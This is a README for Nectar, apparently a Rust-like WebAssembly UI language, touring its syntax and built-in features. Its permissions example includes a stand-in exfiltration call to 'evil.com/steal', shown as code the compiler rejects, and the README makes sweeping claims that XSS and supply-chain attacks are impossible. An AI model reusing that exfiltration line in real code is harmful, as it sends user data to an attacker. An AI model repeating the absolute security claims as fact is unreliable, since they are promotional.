# Nectar

**A programming language that compiles to WebAssembly, built for the next era of web development.**

<!-- Badges -->
![License: MIT](https://img.shields.io/badge/license-MIT-blue.svg)
![Build Status](https://img.shields.io/badge/build-passing-brightgreen.svg)
![WASM](https://img.shields.io/badge/target-WebAssembly-654ff0.svg)

Nectar combines Rust's ownership model and type safety with React-like declarative UI primitives, compiling everything to WebAssembly for near-native performance. No garbage collector. No virtual DOM. No runtime overhead. Just fine-grained reactive signals that surgically update exactly the DOM nodes that changed -- in O(1) time.

---

## Why Nectar?

Modern web development forces you to choose: **safety** (Rust, but no UI story), **developer experience** (React, but runtime bloat and GC pauses), or **performance** (hand-written WASM, but painful). Nectar eliminates the trade-off.

| | Rust | React/Svelte | Nectar |
|---|---|---|---|
| Memory safety | Ownership + borrow checker | GC | Ownership + borrow checker |
| Reactivity | Manual | Virtual DOM / compiler magic | Fine-grained signals (O(1)) |
| Output | Native binary | JavaScript bundle | WebAssembly |
| UI primitives | None (3rd party) | Components | Components, stores, routers, agents |
| AI integration | None | Library | First-class (`agent`, `tool`, `prompt`) |
| API safety | Manual | Types erased at runtime | Contracts — compile-time + runtime + wire-level |
| Security | Manual / opt-in | `dangerouslySetInnerHTML` exists | XSS impossible, `secret` types, capability permissions |
| Mobile/PWA | Library (Workbox, etc.) | Library | First-class (`app`, `offline`, `gesture`, `haptic`) |
| SEO/AAIO | N/A | Requires Next.js + manual setup | Built-in (`page`, `meta`, auto sitemap/JSON-LD) |
| Forms | Manual | Library (Formik, RHF) | First-class (`form`, `field`, built-in validation) |
| Real-time | Library (Socket.io) | Library | First-class (`channel`, auto-reconnect, typed messages) |
| Concurrency | Manual Web Workers | N/A | `spawn` and `parallel` — compiler handles threading |
| Error handling | Optional (try/catch) | Optional | Exhaustive — `must_use`, Result/Option mandatory handling |
| Memory safety | Manual cleanup | Manual | Compiler-detected leaks, ownership-based lifecycle |
| Bundle size | N/A | 100KB+ min (React+deps) | WASM binary, code splitting via `chunk` keyword |
| State races | Possible | Possible | Compiler-detected, `atomic` signals for safe shared state |
| Supply chain | npm (1000s of deps) | npm (1000s of deps) | Zero JS dependencies — flat WASM binary |
| Third-party scripts | Raw `<script>` tags | Raw `<script>` tags | Sandboxed `embed` with loading control and SRI |
| Time/timezone | `Date` (broken) + libraries | N/A | First-class `Instant`, `ZonedDateTime`, `Duration` types |
| PDF generation | jsPDF / Puppeteer | Library | `pdf` keyword renders components to PDF |
| Payments | Stripe SDK (3rd party JS) | Library | `payment` keyword with PCI-compliant sandbox |
| Authentication | NextAuth / Auth0 / Passport | Library | `auth` keyword with built-in OAuth/session |
| File uploads | Manual XHR/fetch | Manual | `upload` keyword with progress, chunked, validation |
| Local database | IndexedDB (terrible API) | N/A | `db` keyword with declarative schema |
| Observability | Sentry / Datadog (3rd party) | Manual | `trace` blocks with built-in performance metrics |
| Feature flags | LaunchDarkly / manual | Manual | `flag()` with compile-time DCE |
| Environment vars | dotenv / NEXT_PUBLIC_ | getenv() | `env()` with compile-time validation |
| Data caching | React Query / SWR (13KB+) | N/A | `cache` keyword with deduplication, SWR, optimistic updates — 0KB |

Nectar was designed from the ground up with these principles:

- **No GC, ever.** Ownership and borrowing at the language level means predictable, zero-pause memory management.
- **O(1) reactive updates.** Signals track dependencies at compile time. When state changes, only the exact DOM nodes that depend on it are updated -- no diffing, no reconciliation.
- **AI-native.** The `agent` keyword, `tool` definitions, and `prompt` templates are part of the grammar, not a library. Build AI-powered interfaces with the same safety guarantees as the rest of your code.
- **API boundary safety.** The `contract` keyword defines the shape of external data. The compiler checks field access, the runtime validates responses in WASM, and a content hash on the wire catches backend drift. The entire class of FE/BE data mismatch bugs is eliminated.
- **Security by elimination.** XSS is structurally impossible -- the rendering pipeline has no `innerHTML`. Prototype pollution cannot happen -- WASM linear memory has no prototype chain. The `secret` keyword prevents sensitive data from being logged or rendered. `permissions` blocks restrict component capabilities at compile time. There are zero JavaScript dependencies -- no `node_modules`, no supply chain risk.
- **Mobile-native PWA.** The `app` keyword generates PWA manifests, service workers, and offline strategies. `gesture` blocks handle swipes, long-press, and pinch. `haptic` provides vibration feedback. Nectar apps install to the home screen, work offline, and feel native -- not like a web page in a browser frame.
- **One toolchain.** Compiler, formatter, linter, test runner, dev server, package manager, and LSP -- all in one binary.

---

## Quick Start

### Install from source

```bash
git clone https://github.com/BlakeBurnette/nectar-lang.git
cd nectar-lang
cargo build --release
```

The compiler binary is at `./target/release/nectar`.

### Hello World

Create `hello.nectar`:

```nectar
component Hello(name: String) {
    render {
        <div>
            <h1>"Hello from Nectar!"</h1>
            <p>{name}</p>
        </div>
    }
}
```

### Compile and run

```bash
# Compile to WebAssembly text format (.wat)
./target/release/nectar build hello.nectar

# Compile to binary WebAssembly (.wasm)
./target/release/nectar build hello.nectar --emit-wasm

# Start the dev server with hot reload
./target/release/nectar dev --src . --port 3000
```

---

## Language Tour

### Variables & Types

Nectar has a Rust-like type system with ownership semantics. Variables are immutable by default.

```nectar
// Immutable binding
let name: String = "Nectar";
let age: u32 = 1;
let pi: f64 = 3.14159;
let active: bool = true;

// Mutable binding
let mut count: i32 = 0;
count = count + 1;

// Type inference
let message = "hello";  // inferred as String

// Reactive signal — automatically tracks dependencies
signal counter: i32 = 0;

// Ownership: values are moved by default
let a: String = "hello";
let b = a;          // `a` is moved into `b`; using `a` after this is a compile error

// Borrowing
let r: &String = &b;         // immutable borrow
let mr: &mut String = &mut b; // mutable borrow
```

**Primitive types:** `i32`, `i64`, `u32`, `u64`, `f32`, `f64`, `bool`, `String`

**Compound types:** `[T]` (arrays), `(T, U)` (tuples), `Option<T>`, `Result<T, E>`

### Functions

```nectar
fn add(a: i32, b: i32) -> i32 {
    a + b
}

fn greet(name: &String) -> String {
    format("Hello, {}!", name)
}

// Public function
pub fn factorial(n: u32) -> u32 {
    if n <= 1 { 1 } else { n * factorial(n - 1) }
}

// Functions with lifetime annotations
fn longest<'a>(a: &'a String, b: &'a String) -> &'a String {
    if a.len() > b.len() { a } else { b }
}
```

### Components

Components are first-class UI primitives with props, state, methods, scoped styles, and a render block.

```nectar
component Counter(initial: i32) {
    let mut count: i32 = initial;

    fn increment(&mut self) {
        self.count = self.count + 1;
    }

    fn decrement(&mut self) {
        self.count = self.count - 1;
    }

    style {
        .counter {
            font-size: "24px";
            padding: "16px";
        }
        .counter button {
            margin: "0 4px";
        }
    }

    render {
        <div class="counter">
            <h2>"Counter"</h2>
            <span>{self.count}</span>
            <button on:click={self.increment}>"+1"</button>
            <button on:click={self.decrement}>"-1"</button>
        </div>
    }
}
```

Components support:
- **Props** -- immutable inputs declared in the parameter list
- **State** -- `let mut` or `signal` fields that trigger re-renders
- **Methods** -- functions that operate on component state via `&self` or `&mut self`
- **Scoped styles** -- CSS that is automatically scoped to the component
- **Event handlers** -- `on:click`, `on:input`, `on:submit`, etc.
- **Generic type parameters** and **trait bounds**
- **Error boundaries** -- catch render errors with a fallback UI

### Stores

Stores are global reactive state containers, inspired by Flux/Redux but with fine-grained signal reactivity.

```nectar
struct User {
    id: u32,
    name: String,
    email: String,
}

enum AuthStatus {
    LoggedOut,
    Loading,
    LoggedIn(User),
    Error(String),
}

store AuthStore {
    // Signals — reactive state fields
    signal status: AuthStatus = AuthStatus::LoggedOut;
    signal token: String = "";

    // Synchronous action
    action logout(&mut self) {
        self.status = AuthStatus::LoggedOut;
        self.token = "";
    }

    // Async action — fetches from an API
    async action login(&mut self, email: String, password: String) {
        self.status = AuthStatus::Loading;
        let response = await fetch("https://api.example.com/auth/login", {
            method: "POST",
            headers: { "Content-Type": "application/json" },
            body: format("{\"email\": \"{}\", \"password\": \"{}\"}", email, password),
        });
        if response.status == 200 {
            let user = response.json();
            self.token = response.headers.get("Authorization");
            self.status = AuthStatus::LoggedIn(user);
        } else {
            self.status = AuthStatus::Error("Login failed");
        }
    }

    // Computed — derived from signals, cached and auto-updated
    computed is_logged_in(&self) -> bool {
        match self.status {
            AuthStatus::LoggedIn(_) => true,
            _ => false,
        }
    }

    // Effect — side effect that runs whenever dependencies change
    effect on_auth_change(&self) {
        match self.status {
            AuthStatus::LoggedIn(user) => {
                println(format("User logged in: {}", user.name));
            }
            _ => {}
        }
    }
}

// Using a store from any component
component Dashboard() {
    render {
        <div>
            <p>{format("Logged in: {}", AuthStore::is_logged_in())}</p>
            <button on:click={AuthStore::logout}>"Sign Out"</button>
        </div>
    }
}
```

### Structs & Enums

```nectar
struct Todo {
    id: u32,
    text: String,
    done: bool,
}

enum Filter {
    All,
    Active,
    Completed,
}

// Enums with data
enum AuthStatus {
    LoggedOut,
    Loading,
    LoggedIn(User),
    Error(String),
}

// Struct instantiation
let todo = Todo {
    id: 0,
    text: "Learn Nectar",
    done: false,
};
```

### Traits

```nectar
trait Display {
    fn to_string(&self) -> String;
}

trait Drawable {
    fn draw(&self);
    // Default implementation
    fn debug_draw(&self) {
        println("Drawing...");
        self.draw();
    }
}

// Implementing a trait
impl Display for Todo {
    fn to_string(&self) -> String {
        format("[{}] {}", if self.done { "x" } else { " " }, self.text)
    }
}
```

### Generics

```nectar
fn first<T>(items: [T]) -> &T {
    &items[0]
}

// With trait bounds
fn print_all<T: Display>(items: [T]) {
    for item in &items {
        println(item.to_string());
    }
}

// Generic structs
struct Pair<A, B> {
    first: A,
    second: B,
}

// Where clauses
fn compare<T>(a: &T, b: &T) -> bool where T: Eq {
    a == b
}
```

### Pattern Matching & Destructuring

Nectar supports exhaustive pattern matching with the `match` expression. The compiler checks that all variants are covered.

```nectar
// Match on enums
match status {
    AuthStatus::LoggedOut => println("Not logged in"),
    AuthStatus::Loading => println("Please wait..."),
    AuthStatus::LoggedIn(user) => println(format("Hello, {}", user.name)),
    AuthStatus::Error(msg) => println(format("Error: {}", msg)),
}

// Destructuring let
let (x, y) = (10, 20);
let Todo { text, done, .. } = todo;
let [first, second, ..] = items;

// Pattern matching in match arms
match point {
    (0, 0) => "origin",
    (x, 0) => format("x-axis at {}", x),
    (0, y) => format("y-axis at {}", y),
    (x, y) => format("({}, {})", x, y),
}

// Wildcard
match filter {
    Filter::All => &self.todos,
    _ => self.todos.iter().filter(fn(t: &Todo) -> bool { !t.done }),
}
```

### Closures & Iterators

```nectar
// Closure syntax
let double = fn(x: i32) -> i32 { x * 2 };

// Iterator chains
let active_names = todos.iter()
    .filter(fn(t: &Todo) -> bool { !t.done })
    .map(fn(t: &Todo) -> String { t.text })
    .collect();

// For loops over iterators
for todo in &mut self.todos {
    if todo.id == id {
        todo.done = !todo.done;
    }
}
```

### Error Handling

```nectar
// Option type
let user: Option<User> = None;

match user {
    Some(u) => println(u.name),
    None => println("No user"),
}

// Result type
struct ApiError {
    status: u32,
    message: String,
}

// The ? operator propagates errors
fn fetch_user(id: u32) -> Result<User, ApiError> {
    let response = await fetch(format("https://api.example.com/users/{}", id));
    let user = response.json()?;
    return Ok(user);
}

// Try/catch blocks
try {
    let data = fetch_user(42)?;
    println(data.name);
} catch err {
    println(format("Failed: {}", err.message));
}
```

### Contracts — API Boundary Safety

Contracts are Nectar's solution to the most common class of frontend bugs: **data shape mismatches between frontend and backend**. They enforce the shape of external data (API responses, WebSocket messages, etc.) at three levels:

1. **Compile-time** — If you access a field that doesn't exist on the contract, the compiler catches it. Not the user's browser three weeks later.
2. **Runtime boundary validation** — Every API response is validated in WASM before it enters your app. Malformed data never propagates. External data is **untrusted by default**, like Rust's `unsafe` boundary.
3. **Wire-level staleness detection** — A SHA-256 content hash (truncated to 8 hex chars) is embedded in every request. If the backend was built against a different contract version, the mismatch is caught on the first request.

```nectar
// Define the shape of an API response
contract CustomerResponse {
    id: u32,
    name: String,
    email: String,
    balance_cents: i64,
    tier: enum { free, pro, enterprise },
    created_at: String,
    deleted_at: String?,   // nullable field
}

// fetch -> ContractName validates the response at the boundary
let customer = await fetch("/api/customers/42") -> CustomerResponse;

// Compile-time checked field access:
let name = customer.name;       // OK
let tier = customer.tier;       // OK
let x = customer.display_name;  // COMPILE ERROR: contract CustomerResponse
                                // has no field display_name
```

Every request with a contract binding automatically includes a hash header:

```
GET /api/customers/42
X-Nectar-Contract: CustomerResponse@a3f8b2c1
```

The backend middleware checks this hash against the contract it was built with. If they don't match, you get an immediate, actionable error — not `undefined is not a function` three clicks deep.

#### Contract Export

The compiler can export contracts as JSON Schema, OpenAPI, or Protobuf definitions for backend teams:

```bash
nectar export-contracts --format jsonschema  > schemas/
nectar export-contracts --format openapi     > api-spec.yaml
nectar export-contracts --format protobuf    > contracts.proto
```

The frontend is the source of truth for the API shape it consumes. The backend validates against the same contract in CI. If their response shape drifts, **their build fails** — not the users' browsers.

| Approach | Compile-time | Runtime | Backend-agnostic | Zero-cost when valid |
|---|---|---|---|---|
| TypeScript types | Yes | **No** (erased) | Yes | N/A |
| Zod/io-ts | No | Yes | Yes | No (JS overhead) |
| tRPC | Yes | Yes | **No** (TS only) | No |
| GraphQL | Partial | Partial | Yes | No |
| **Nectar contracts** | **Yes** | **Yes** | **Yes** | **Yes** (WASM) |

### Security

Nectar makes entire vulnerability classes **structurally impossible** at the language level -- not through best practices or linting, but by eliminating the mechanisms that enable them.

#### XSS Is Impossible

The WASM-to-DOM bridge only exposes `setText()` (which sets `textContent`) and `setAttribute()`. There is no `innerHTML`, no `dangerouslySetInnerHTML`, no `eval()`, no `document.write()`. The language **does not have a mechanism** to inject raw HTML. This is not a lint rule you can disable -- the capability does not exist.

#### Prototype Pollution Is Impossible

WASM linear memory is a flat byte array. There is no `__proto__`, no `constructor.prototype`, no `Object.assign` spreading attacker-controlled keys into your object tree. An entire class of supply chain attacks evaporates because the attack surface does not exist.

#### Zero Supply Chain Risk

Nectar compiles to a flat WASM binary. There is no `node_modules` directory with 1,400 transitive dependencies, no `postinstall` scripts running arbitrary code, no lodash version conflict. The attack surface is the Nectar runtime (which you audit once) and your own code.

#### Secret Types

The `secret` modifier prevents sensitive values from being logged, serialized to JSON, rendered to the DOM, or leaked through error messages. The compiler enforces this -- not a code review.

```nectar
let secret api_key: String = env("STRIPE_KEY");
let secret password: String = form.password;

// COMPILE ERROR: cannot pass secret value to non-secret context
console.log(api_key);          // error: cannot log secret value
setText(el, password);         // error: cannot render secret to DOM
json.serialize(api_key);       // error: cannot serialize secret

// OK: secret flows to secret-accepting functions
stripe.charge(api_key, amount);
hash(password);
```

#### Capability-Based Permissions

Components declare what they can access. The compiler enforces it. A component that does not declare network access cannot call `fetch`.

```nectar
component PaymentForm() {
    permissions {
        network: ["https://api.stripe.com/*"],
        storage: ["session:auth_token"],
        capabilities: ["camera", "geolocation"],
    }

    // OK: URL matches declared network permission
    let charge = await fetch("https://api.stripe.com/v1/charges") -> ChargeResponse;

    // COMPILE ERROR: URL not in declared permissions
    let leak = await fetch("https://evil.com/steal");
    //                      ^^^^^^^^^^^^^^^^^^^^^^^^
    //  error: fetch URL does not match any declared network permission

    render {
        <form on:submit={self.handle_pay}>
            <input type="text" bind:value={card_number} />
            <button>"Pay Now"</button>
        </form>
    }
}
```

#### Automatic CSP Generation

The compiler analyzes every `fetch()` URL, image source, and font reference in your code and emits a tight Content-Security-Policy header:

```bash
nectar build app.nectar --emit-csp
# default-src 'self'; connect-src https://api.payhive.com https://api.stripe.com; ...
```

No manual CSP authoring. No accidentally leaving `unsafe-inline`. The policy is derived from the code.

### Progressive Web App (PWA)

Nectar apps are mobile-native by default. The `app` keyword replaces the need for separate PWA tooling, service worker libraries, and manifest generators.

#### App Declaration

```nectar
app PayHive {
    manifest {
        name: "PayHive",
        short_name: "PayHive",
        theme_color: "#303234",
        background_color: "#303234",
        display: "standalone",
        orientation: "portrait",
    }

    offline {
        precache: ["/", "/app", "/app/schedule", "/app/customers"],
        strategy: "stale-while-revalidate",
        fallback: OfflinePage,
    }

    push {
        vapid_key: env("VAPID_PUBLIC_KEY"),
        on_message: handle_push,
    }

    router AppRouter {
        route "/" => Home,
        route "/app" => Dashboard,
        route "/app/schedule" => Schedule,
    }
}
```

The compiler generates:
- `manifest.webmanifest` for Add to Home Screen / app install
- A service worker with precaching and runtime caching
- App shell HTML that loads instantly from cache
- Splash screen matching the manifest theme

The result is a **standalone app** with no browser chrome -- it looks and feels like a native mobile app.

#### Gestures

First-class gesture recognition eliminates the need for gesture libraries like Hammer.js:

```nectar
component ScheduleView() {
    gesture swipe_left {
        navigate("/app/schedule/next-week");
    }

    gesture swipe_right {
        navigate("/app/schedule/prev-week");
    }

    gesture swipe_down {
        self.refresh();
    }

    gesture pinch on:schedule_map {
        self.toggle_zoom();
    }

    gesture long_press on:customer_card {
        self.show_context_menu();
        haptic("medium");
    }

    render {
        <div class="schedule">
            // ...
        </div>
    }
}
```

#### Hardware Access

Native device APIs are first-class language constructs:

```nectar
// Biometric authentication (WebAuthn)
let credential = await biometric.authenticate({
    challenge: server_challenge,
    rp: "payhive.com",
});

// Camera for document scanning
let photo = await camera.capture({ facing: "rear" });

// GPS for field service
let location = await geolocation.current();

// Haptic feedback
haptic("success");
```

#### Distribution

```bash
nectar build app.nectar --target pwa          # PWA — installable from browser
nectar build app.nectar --target twa          # Android Trusted Web Activity (Play Store)
nectar build app.nectar --target capacitor    # iOS/Android native wrapper (App Store)
```

### SEO & AAIO (AI Answer Optimization)

Single Page Applications are invisible to search engines and AI systems by default. Nectar makes SEO a **compile-time guarantee**.

#### The SPA Problem

Traditional SPAs serve an empty HTML shell. Crawlers -- both search engines and AI systems (ChatGPT Browse, Perplexity, Google SGE) -- see nothing:

```html
<!-- What a React SPA serves to crawlers -->
<html><body><div id="root"></div><script src="bundle.js"></script></body></html>
```

Next.js and Nuxt bolt on SSR/SSG as afterthoughts, requiring a Node.js server, complex configuration, and hydration mismatch bugs.

#### The `page` Keyword

Nectar's `page` keyword declares a component that the compiler **pre-renders to static HTML at build time**:

```nectar
page BlogPost(slug: String) {
    meta {
        title: f"Blog | {self.title}",
        description: self.excerpt,
        canonical: f"/blog/{slug}",
        structured_data: Schema.Article {
            headline: self.title,
            author: self.author,
            date_published: self.date,
        },
    }

    render {
        <article>
            <h1>{self.title}</h1>
            <p>{self.excerpt}</p>
        </article>
    }
}
```

#### What the Compiler Generates

From a `page` definition and a `router`, the Nectar compiler automatically produces:

| Artifact | Source | Manual in React? |
|---|---|---|
| Pre-rendered HTML | `page` + `render` block | Requires Next.js + config |
| `<title>` and meta tags | `meta` block | Manual `<Head>` per page |
| Open Graph tags | `meta { og_image }` | Manual per page |
| JSON-LD structured data | `meta { structured_data }` | Manual JSON strings |
| `sitemap.xml` | `router` routes | Requires `next-sitemap` plugin |
| `robots.txt` | Auto-generated | Manual file |
| Canonical URLs | `meta { canonical }` | Manual per page |

#### Semantic HTML Enforcement

The compiler warns when you use non-semantic HTML where semantic elements are appropriate:

```
warning[semantic_html]: <div> used as page wrapper — consider <main>, <article>, or <section>
  --> src/pages/blog.nectar:12:9
   |
12 |         <div class="post">
   |         ^^^^ non-semantic element
   |
   = help: semantic HTML improves SEO ranking and AI content extraction
```

#### Build Targets

```bash
nectar build site.nectar --target ssg       # Static — pre-render all routes at build time
nectar build site.nectar --target ssr       # Server — WASM renders on edge/server per request
nectar build site.nectar --target hybrid    # Static for known routes, SSR for dynamic
```

#### AAIO: AI Answer Optimization

AI systems (ChatGPT, Perplexity, Claude, Google SGE) extract answers from web content. Nectar optimizes for this automatically:

- **Structured data**: JSON-LD generated from `Schema.*` declarations tells AI systems exactly what your content represents
- **Semantic HTML**: `<article>`, `<main>`, `<section>` help AI systems understand content hierarchy
- **Clean DOM**: No framework wrapper divs -- WASM renders minimal, semantic markup
- **Pre-rendered content**: AI crawlers see full content without executing JavaScript

### Declarative Forms

Forms are 30-50% of most application code. In React, a single form with validation requires useState, onChange handlers, onBlur tracking, error state, dirty checking, and submit handling — often 50-100 lines before you've done anything useful.

Nectar's `form` keyword makes forms a language construct:

```nectar
form ContactForm {
    field name: String {
        label: "Full Name",
        required,
        min_length: 2,
    }

    field email: String {
        label: "Email",
        required,
        email,
    }

    fn on_submit(&self) {
        let response = fetch("/api/contact");
    }
}
```

**Built-in validators:** `required`, `min_length`, `max_length`, `pattern`, `email`, `url`, `min`, `max`, and custom validator functions.

Validation, dirty tracking, touched state, error display, and submit handling are all automatic. No library needed.

### Real-time Channels

WebSocket connections in JavaScript require manual reconnection logic, heartbeat monitoring, message parsing, and error handling. Libraries like Socket.io add 50KB+ to your bundle.

Nectar's `channel` keyword provides type-safe real-time connections:

```nectar
channel Chat -> ChatMessage {
    url: "wss://api.example.com/ws/chat",
    reconnect: true,
    heartbeat: 30000,

    on_message fn(msg: ChatMessage) {
        // Already typed via contract binding
    }
}
```

Automatic reconnection with exponential backoff (capped at 30s), heartbeat monitoring, and type-safe messages via contract binding. Zero configuration.

### Transparent Concurrency

Long computations freeze the UI in JavaScript. Web Workers exist but require separate files, manual message passing, and structured clone limitations.

Nectar's `spawn` keyword runs blocks off the main thread automatically:

```nectar
let result = spawn {
    let data = load_raw_data();
    let cleaned = clean(data);
    analyze(cleaned)
};
// UI stays responsive — computation ran in a Web Worker
```

`parallel` runs multiple operations concurrently:

```nectar
let results = parallel {
    fetch("/api/users"),
    fetch("/api/orders"),
    fetch("/api/inventory"),
};
```

The compiler handles serialization, Worker creation, and data transfer. No boilerplate.

### Exhaustive Error Handling

JavaScript's error handling is optional. Unhandled promise rejections silently break applications. `try/catch` is opt-in and easy to forget.

Nectar enforces error handling at compile time:

```nectar
must_use fn fetch_user(id: String) -> Result<String, String> {
    // ...
}

// COMPILE ERROR: return value of must_use function must be used
fetch_user("123");

// COMPILE ERROR: non-exhaustive match — missing Err arm
match fetch_user("123") {
    Ok(user) => { /* ... */ },
}

// Correct — both arms handled
match fetch_user("123") {
    Ok(user) => { /* use it */ },
    Err(e) => { /* handle it */ },
}
```

- **`must_use` functions**: Compiler error if the return value is discarded
- **Exhaustive Result/Option matching**: Both `Ok`/`Err` (or `Some`/`None`) arms required
- **No silent failures**: Every error path must be explicitly handled

### Bundle Size & Code Splitting

A minimal React app ships 100KB+ gzipped before you write a line of code. Nectar compiles to a flat WASM binary with zero JavaScript dependencies.

The `chunk` keyword enables manual code-split boundaries:

```nectar
component HeavyChart() {
    chunk "analytics"

    render {
        <div class="chart">
            // Only loaded when this component is needed
        </div>
    }
}
```

Dynamic imports trigger automatic chunk loading:

```nectar
let module = import("./heavy-module");
```

Combined with tree shaking and dead code elimination, Nectar produces minimal binaries.

### Runtime Tree-Shaking

Nectar's runtime is split into 22 independent modules. The compiler analyzes your program and includes only the modules you actually use:

```
$ nectar build hello.nectar
nectar: runtime modules: core (1 of 22)
Bundle: 3.2KB

$ nectar build full-app.nectar
nectar: runtime modules: core,seo,form,cache,auth,channel (6 of 22)
Bundle: 12.1KB
```

A hello-world app includes only the core signal/DOM bridge (~3KB). Each feature you use adds only its specific runtime code. Features you don't use have zero cost — not even dead code in your binary.

| App complexity | React | Nectar |
|---|---|---|
| Hello world | ~45KB (React + ReactDOM) | ~3KB (core only) |
| With caching | +13KB (React Query) | +0KB (compiled in) |
| With auth + forms + cache | +40KB (libraries) | ~12KB (only used modules) |
| Full SaaS app | 200-500KB+ | 15-25KB (all modules) |

### Race-Free State & Memory Safety

**Atomic signals** prevent race conditions when multiple components share state:

```nectar
store AppStore {
    signal atomic counter: i32 = 0;
    selector doubled: self.counter * 2;
}
```

The compiler detects when multiple components mutate the same store without `atomic` signals and warns at build time.

**Memory leak detection** catches common resource leaks:

```
warning[resource_leak]: component uses addEventListener but has no on_destroy — potential memory leak
  --> src/components/tracker.nectar:15:9
```

The compiler tracks event listeners, intervals, timeouts, and subscriptions, warning when cleanup handlers are missing.

### Third-Party Embeds

Third-party scripts are the biggest security and performance hole in modern web apps. Nectar's `embed` keyword sandboxes external scripts with controlled loading strategies and subresource integrity verification.

```nectar
embed ChatWidget {
    src: "https://widget.intercom.io/widget/app123",
    loading: "idle",       // defer | async | lazy | idle
    sandbox: true,         // runs in iframe, can't touch your DOM
    integrity: "sha384-...",
}
```

Loading strategies: `defer` (after DOM), `async` (non-blocking), `lazy` (on viewport), `idle` (requestIdleCallback). All embeds are auditable with `nectar audit`. See [`examples/embeds.nectar`](examples/embeds.nectar).

### Time & Timezones

JavaScript's `Date` is broken. Nectar has proper time types built into the language -- no moment.js, no date-fns, no Temporal polyfill.

```nectar
let meeting: ZonedDateTime = time.zoned("2026-03-15T14:00", "America/New_York");
let tokyo: ZonedDateTime = meeting.in_timezone("Asia/Tokyo");
let next_week: ZonedDateTime = meeting.add(Duration.days(7));  // DST-safe
let formatted: String = meeting.format("MMMM d, yyyy h:mm a z");
```

**Types:** `Instant` (UTC point in time), `ZonedDateTime` (instant + timezone), `Duration` (length of time), `Date` (calendar date), `Time` (wall clock). All timezone conversions are explicit. DST transitions are handled correctly. See [`examples/time.nectar`](examples/time.nectar).

### PDF & Downloads

Generate PDFs from render blocks and trigger browser downloads. No jsPDF, no Puppeteer, no headless browser.

```nectar
pdf InvoicePdf {
    page_size: "A4",
    orientation: "portrait",
    render { <div class="invoice"><h1>"Invoice #1234"</h1></div> }
}

// Trigger download from any component
download(InvoicePdf, "invoice-1234.pdf");
```

The `pdf` keyword defines a renderable document. The `download()` builtin triggers the browser's file save dialog. See [`examples/pdf.nectar`](examples/pdf.nectar).

### Payments

Nectar makes payment integration PCI-compliant by default. Payment forms run in sandboxed iframes -- card numbers never touch your component state.

```nectar
payment Checkout {
    provider: "stripe",
    public_key: env("STRIPE_PUBLIC_KEY"),
    sandbox: true,
    fn on_success(result: String) { /* redirect */ }
    fn on_error(error: String) { /* show error */ }
}
```

The compiler guarantees payment data isolation. No Stripe SDK to bundle, no PCI compliance checklist to follow manually. See [`examples/payments.nectar`](examples/payments.nectar).

### Authentication

Authentication is a language construct. OAuth providers, session management, and login/logout flows are declarative.

```nectar
auth AppAuth {
    session: "cookie",
    provider "google" { client_id: env("GOOGLE_CLIENT_ID"), scopes: ["profile", "email"] }
    provider "github" { client_id: env("GITHUB_CLIENT_ID"), scopes: ["user:email"] }
    fn on_login(user: String) { /* redirect to dashboard */ }
}
```

No NextAuth. No Auth0 SDK. No Passport.js. See [`examples/auth.nectar`](examples/auth.nectar).

### File Uploads

File uploads are a language construct with built-in progress tracking, validation, and chunked/resumable support.

```nectar
upload AvatarUpload {
    endpoint: "/api/upload/avatar",
    max_size: 5242880,
    accept: ["image/png", "image/jpeg", "image/webp"],
    chunked: false,
    fn on_progress(percent: i32) { /* update progress bar */ }
    fn on_complete(response: String) { /* update UI */ }
}
```

Max size and MIME type are validated before the upload starts. Chunked uploads resume automatically after network interruption. See [`examples/uploads.nectar`](examples/uploads.nectar).

### Local Database

Nectar wraps IndexedDB with a declarative schema. No raw transactions, no callback hell, no onsuccess/onerror.

```nectar
db AppDatabase {
    version: 1,
    store "users" {
        key: "id",
        index "email" => "email",
    }
}

let data = AppDatabase.query("users");
```

Stores and indexes are declared once. Queries are type-safe via contracts. Schema migrations are version-tracked. See [`examples/database.nectar`](examples/database.nectar).

### Observability

Built-in tracing, feature flags, and error tracking -- no Sentry SDK, no Datadog agent, no LaunchDarkly.

```nectar
let result = trace("dashboard.load") {
    let users = fetch("/api/users");
    "loaded"
};

// Feature flags with compile-time dead code elimination
if flag("new_dashboard") { /* new UI */ } else { /* old UI */ }
```

`trace` blocks measure execution time automatically and report to the configured backend. `flag()` checks are eliminated at compile time when flags are resolved, producing zero runtime overhead. See [`examples/observability.nectar`](examples/observability.nectar).

### Data Caching

Every SaaS app needs data caching. In React, that means React Query (13KB), SWR (4KB), or Apollo Cache — each a separate library with its own API, adding to your bundle.

Nectar's `cache` keyword provides declarative caching as a language feature:

```nectar
cache AppCache {
    strategy: "stale-while-revalidate",
    ttl: 300,
    persist: true,

    query users: fetch("/api/users") -> UserList {
        ttl: 60,
        stale: 30,
    }

    mutation update_user(id: String): fetch(f"/api/users/{id}") {
        optimistic: true,
        rollback_on_error: true,
        invalidate: ["users"],
    }
}
```

- **Compile-time request deduplication**: If 5 components call `AppCache.users`, only 1 request fires
- **Stale-while-revalidate**: Show cached data instantly, refresh in background
- **Optimistic mutations**: Update UI immediately, rollback if server rejects
- **Persistent cache**: `persist: true` stores in IndexedDB via the `db` keyword
- **Contract-typed**: Cached data uses your contracts for compile-time field checking
- **Zero bundle impact**: Compiled into WASM, not shipped as a runtime library

### Environment Variables

The `env()` builtin reads environment variables with **compile-time validation**. If a required variable is missing at build time, the compiler errors -- not the user's browser at runtime.

```nectar
let api_key = env("STRIPE_PUBLIC_KEY");     // validated at compile time
let optional = env("DEBUG_MODE", "false");  // default value
```

No dotenv. No `NEXT_PUBLIC_` prefix conventions. No `process.env` that silently returns `undefined`.

### String Interpolation

```nectar
// Using format()
let greeting = format("Hello, {}!", name);

// Format strings with f"..."
let message = f"Count: {self.count}";
let summary = f"{user.name} has {posts.len()} posts";

// In templates
render {
    <p>{f"Welcome back, {user.name}!"}</p>
    <span>{format("Total: {} items", items.len())}</span>
}
```

### Async/Await & Fetch

`fetch` is a first-class language construct, not a library import.

```nectar
// GET request
let response = await fetch("https://jsonplaceholder.typicode.com/posts");
let posts: [Post] = response.json();

// POST request with options
let response = await fetch("https://api.example.com/posts", {
    method: "POST",
    headers: {
        "Content-Type": "application/json",
    },
    body: format("{\"title\": \"{}\", \"body\": \"{}\"}", title, body),
});

// DELETE request
let response = await fetch(url, { method: "DELETE" });

// Async store actions
async action fetch_posts(&mut self) {
    self.loading = true;
    let response = await fetch("https://api.example.com/posts");
    if response.status == 200 {
        self.posts = response.json();
    }
    self.loading = false;
}
```

### Concurrency

```nectar
// Spawn a task on a Web Worker
spawn {
    let result = heavy_computation();
    println(result);
};

// Channels for inter-task communication
let ch = channel::<String>();
spawn {
    ch.send("hello from worker");
};
let message = ch.receive();

